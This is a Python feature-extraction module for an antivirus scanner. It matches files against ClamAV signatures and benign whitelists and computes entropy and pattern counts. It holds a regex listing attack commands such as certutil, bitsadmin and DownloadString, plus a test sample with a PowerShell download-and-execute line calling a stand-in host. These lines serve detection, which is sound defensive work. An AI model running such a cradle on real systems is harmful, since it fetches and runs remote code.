#!/usr/bin/env python3
"""
HydraDragon Universal String & Byte Matcher Engine (Python Edition)
Powered by Double-Array Aho-Corasick (pyahocorasick)
Extracts 24 universal string, signature, and entropy features from ANY raw byte stream.
Works seamlessly on:
  - Windows PE / DLL files
  - Android APKs / DEX files
  - Scripts (JavaScript, PowerShell, VBScript, Bash, Python)
  - Unknown / headerless binaries, shellcode, and memory dumps
  - Text, HTML, XML, JSON, and config files
"""

import os
import sys
import re
import math
import glob
from collections import Counter
from typing import List, Tuple, Set, Optional

import numpy as np
import joblib
import ahocorasick

# Precompiled regexes
RE_ASCII_STRINGS = re.compile(rb"[\x20-\x7e]{4,}")
RE_UTF16_STRINGS = re.compile(rb"(?:[\x20-\x7e]\x00){4,}")
RE_BASE64 = re.compile(rb"(?:[A-Za-z0-9+/]{4}){8,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?")
RE_HEX_RUN = re.compile(rb"(?:[0-9a-fA-F]{2}){8,}")
RE_URL = re.compile(rb"https?://[a-zA-Z0-9_\-\.:/]+", re.I)
RE_IPV4 = re.compile(rb"\b(?:\d{1,3}\.){3}\d{1,3}\b")
RE_SUSP_COMMANDS = re.compile(
    rb"powershell|cmd\.exe|invoke-expression|iex\b|downloadstring|bypass|hidden|"
    rb"certutil|bitsadmin|vssadmin|wscript\.shell|wscript\.network|shellexecute|"
    rb"reg\s+add|schtasks|rundll32|regsvr32|curl\s|wget\s|chmod\s+\+x|bash\s+-c|eval\(|exec\(",
    re.I
)

# Standard Goodware Windows DLLs, APIs, and runtime strings (yarGen goodware base)
BENIGN_CORE_STRINGS = [
    b"kernel32.dll", b"user32.dll", b"ntdll.dll", b"advapi32.dll", b"shell32.dll",
    b"ole32.dll", b"oleaut32.dll", b"ws2_32.dll", b"gdi32.dll", b"comctl32.dll",
    b"ExitProcess", b"GetProcAddress", b"LoadLibraryA", b"LoadLibraryW",
    b"VirtualAlloc", b"VirtualFree", b"GetLastError", b"CloseHandle",
    b"CreateFileW", b"ReadFile", b"WriteFile", b"MultiByteToWideChar",
    b"WideCharToMultiByte", b"GetModuleHandleW", b"GetStartupInfoW",
    b"Microsoft Corporation", b"Windows", b"Standard C++ Library",
    b"System.Windows.Forms", b"System.Collections.Generic", b"mscorlib",
    b"android.os.Bundle", b"androidx.appcompat", b"com.google.android",
    b"java.lang.String", b"java.util.ArrayList", b"AndroidManifest.xml",
    b"classes.dex", b"resources.arsc", b"xmlns:android",
    b"Mozilla/5.0", b"Content-Type", b"text/html", b"utf-8"
]

def ln1p(x: float) -> float:
    if x is None or math.isnan(x) or x <= 0.0:
        return 0.0
    return float(math.log1p(x))

def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    total = len(data)
    counts = Counter(data)
    ent = 0.0
    for count in counts.values():
        p = count / total
        ent -= p * math.log2(p)
    return float(ent)

class UniversalStringMatcher:
    _instance: Optional["UniversalStringMatcher"] = None

    def __init__(self, clamav_dir: str = r"C:\Program Files\ClamAV\database",
                 website_dir: str = r"c:\Users\semae\OneDrive\Belgeler\GitHub\HydraDragonAntivirus\hydradragon\website",
                 cache_path: str = "string_automata_cache.joblib"):
        self.clamav_dir = clamav_dir
        self.website_dir = website_dir
        self.cache_path = os.path.join(os.path.dirname(__file__), cache_path)
        
        self.automaton_mal = ahocorasick.Automaton()
        self.automaton_ben = ahocorasick.Automaton()
        self.is_loaded = False
        self._init_matcher()

    @classmethod
    def get_instance(cls) -> "UniversalStringMatcher":
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    def _init_matcher(self):
        if os.path.exists(self.cache_path):
            try:
                print(f"[*] Loading compiled Aho-Corasick strings from: {self.cache_path}...")
                cached = joblib.load(self.cache_path)
                mal_words = cached["mal_words"]
                ben_words = cached["ben_words"]
                
                for idx, w in enumerate(mal_words):
                    self.automaton_mal.add_word(w, (idx, w))
                self.automaton_mal.make_automaton()
                
                for idx, w in enumerate(ben_words):
                    self.automaton_ben.add_word(w, (idx, w))
                self.automaton_ben.make_automaton()
                
                self.is_loaded = True
                print(f"[+] Loaded {len(mal_words):,} Malicious & {len(ben_words):,} Benign patterns into Automata!")
                return
            except Exception as e:
                print(f"[!] Cache loading failed ({e}), rebuilding automata from sources...")

        self._build_automata()

    def _build_automata(self):
        print("[*] Compiling Universal Malicious & Benign String Corpi from ClamAV & yarGen pools...")
        mal_words: Set[bytes] = set()
        ben_words: Set[bytes] = set()

        # 1. Benign Core Strings (yarGen / Goodware)
        for s in BENIGN_CORE_STRINGS:
            ben_words.add(s.lower())

        # 2. Benign Domains and Whitelist from website_dir
        if os.path.exists(self.website_dir):
            wl_files = ["WhiteListDomains.csv", "BenignIPs.txt", "ALLOW_IPV4.txt"]
            for fname in wl_files:
                fpath = os.path.join(self.website_dir, fname)
                if os.path.isfile(fpath):
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        for i, line in enumerate(f):
                            if i > 50000:
                                break
                            item = line.split(",")[0].strip().lower()
                            if len(item) >= 4 and not item.startswith("#"):
                                ben_words.add(item.encode("utf-8", "ignore"))

        # 3. Malicious Strings from ClamAV Database
        if os.path.exists(self.clamav_dir):
            ndb_files = glob.glob(os.path.join(self.clamav_dir, "*.ndb"))
            ldb_files = glob.glob(os.path.join(self.clamav_dir, "*.ldb"))
            
            for fpath in ndb_files + ldb_files:
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        for i, line in enumerate(f):
                            if i > 5000:  # Cap per file for fast initialization and low RAM
                                break
                            parts = line.strip().split(":")
                            if len(parts) >= 4:
                                hex_cand = parts[3].strip()
                                # Clean hex wildcards
                                clean_hex = re.sub(r"[\*\(\)\{\}\-\?]", "", hex_cand)
                                if len(clean_hex) >= 8 and len(clean_hex) % 2 == 0:
                                    try:
                                        b_val = bytes.fromhex(clean_hex[:64])
                                        if len(b_val) >= 4:
                                            mal_words.add(b_val.lower())
                                    except ValueError:
                                        pass
                except Exception:
                    pass

        # 4. Filter collisions: Whitelist always wins!
        mal_words = {w for w in mal_words if w not in ben_words and len(w) >= 4}
        ben_words = {w for w in ben_words if len(w) >= 4}

        print(f"[+] Compiled {len(mal_words):,} Malicious patterns and {len(ben_words):,} Benign patterns.")

        # Build Automata using latin1 1-to-1 byte mapping
        for idx, w in enumerate(mal_words):
            try:
                self.automaton_mal.add_word(w.decode("latin1"), (idx, w))
            except Exception:
                pass
        self.automaton_mal.make_automaton()

        for idx, w in enumerate(ben_words):
            try:
                self.automaton_ben.add_word(w.decode("latin1"), (idx, w))
            except Exception:
                pass
        self.automaton_ben.make_automaton()

        # Cache to disk for instant subsequent loads
        try:
            joblib.dump({"mal_words": list(mal_words), "ben_words": list(ben_words)}, self.cache_path, compress=3)
            print(f"[+] Saved string automata cache to: {self.cache_path}")
        except Exception as e:
            print(f"[!] Warning: Could not cache automata: {e}")

        self.is_loaded = True

    def extract_features(self, data: bytes) -> List[float]:
        """
        Extracts 24 universal string and byte distribution features from ANY raw data.
        Returns a fixed-length list of 24 float32 values.
        """
        if not data:
            return [0.0] * 24

        file_len = len(data)
        byte_ent = shannon_entropy(data)

        # Extract ASCII and UTF-16 strings
        ascii_matches = RE_ASCII_STRINGS.findall(data)
        utf16_raw = RE_UTF16_STRINGS.findall(data)
        utf16_matches = [b[0::2] for b in utf16_raw]
        all_strings = ascii_matches + utf16_matches

        total_strings = len(all_strings)
        avg_str_len = float(np.mean([len(s) for s in all_strings])) if all_strings else 0.0
        max_str_len = float(max([len(s) for s in all_strings])) if all_strings else 0.0

        # String entropies
        if all_strings:
            str_entropies = [shannon_entropy(s) for s in all_strings[:500]]
            ent_mean = float(np.mean(str_entropies))
            ent_max = float(max(str_entropies))
            high_ent_count = sum(1 for e in str_entropies if e >= 4.5)
        else:
            ent_mean, ent_max, high_ent_count = 0.0, 0.0, 0

        # Aho-Corasick Matching against full byte buffer (lower-cased for case-insensitivity)
        buf_lower = data[:1024 * 1024].lower() # Scan up to 1 MB for speed and efficiency
        buf_latin1 = buf_lower.decode("latin1")

        mal_hits = 0
        mal_unique_ids = set()
        for _, (sig_id, _) in self.automaton_mal.iter(buf_latin1):
            mal_hits += 1
            mal_unique_ids.add(sig_id)

        ben_hits = 0
        ben_unique_ids = set()
        for _, (sig_id, _) in self.automaton_ben.iter(buf_latin1):
            ben_hits += 1
            ben_unique_ids.add(sig_id)

        mal_to_ben_ratio = float(mal_hits) / float(ben_hits + 1.0)
        mal_density = float(mal_hits) / float(total_strings + 1.0)
        ben_density = float(ben_hits) / float(total_strings + 1.0)

        # Specific suspicious string patterns
        base64_count = len(RE_BASE64.findall(buf_lower))
        hex_count = len(RE_HEX_RUN.findall(buf_lower))
        url_count = len(RE_URL.findall(buf_lower))
        ip_count = len(RE_IPV4.findall(buf_lower))
        susp_cmd_count = len(RE_SUSP_COMMANDS.findall(buf_lower))

        # Structural header heuristics
        has_exec_header = 0.0
        if data.startswith(b"MZ") or data.startswith(b"\x7fELF") or data.startswith(b"PK\x03\x04") or data.startswith(b"dex\n"):
            has_exec_header = 1.0

        # Non-ascii & printable character ratios
        printable_bytes = sum(1 for b in data[:4096] if 0x20 <= b <= 0x7E or b in (9, 10, 13))
        sample_size = min(4096, file_len)
        printable_ratio = float(printable_bytes) / float(sample_size) if sample_size > 0 else 0.0
        non_ascii_ratio = 1.0 - printable_ratio

        return [
            ln1p(total_strings),
            ln1p(avg_str_len),
            ln1p(max_str_len),
            byte_ent,
            ent_mean,
            ent_max,
            ln1p(mal_hits),
            ln1p(len(mal_unique_ids)),
            ln1p(ben_hits),
            ln1p(len(ben_unique_ids)),
            mal_to_ben_ratio,
            mal_density,
            ben_density,
            ln1p(mal_hits), # ClamAV signature hit proxy
            ln1p(high_ent_count),
            ln1p(base64_count),
            ln1p(hex_count),
            ln1p(url_count),
            ln1p(ip_count),
            ln1p(susp_cmd_count),
            has_exec_header,
            ln1p(file_len),
            non_ascii_ratio,
            printable_ratio,
        ]

STRING_FEATURE_NAMES = [
    "total_strings", "avg_string_len", "max_string_len", "byte_entropy",
    "string_entropy_mean", "string_entropy_max", "mal_hits_total", "mal_hits_unique",
    "ben_hits_total", "ben_hits_unique", "mal_to_ben_ratio", "mal_density",
    "ben_density", "clamav_sig_hits", "high_entropy_strings_count", "base64_strings_count",
    "hex_strings_count", "url_strings_count", "ip_strings_count", "suspicious_commands_count",
    "has_executable_header", "file_size_log", "non_ascii_ratio", "printable_ratio"
]

if __name__ == "__main__":
    matcher = UniversalStringMatcher.get_instance()
    sample = b"MZ\x90\x00\x03\x00\x00\x00powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://bad.xyz/payload.bin') kernel32.dll ExitProcess"
    feats = matcher.extract_features(sample)
    print("\n[*] Extracted Test Features (24 features):")
    for name, val in zip(STRING_FEATURE_NAMES, feats):
        print(f"  {name:26}: {val:.4f}")
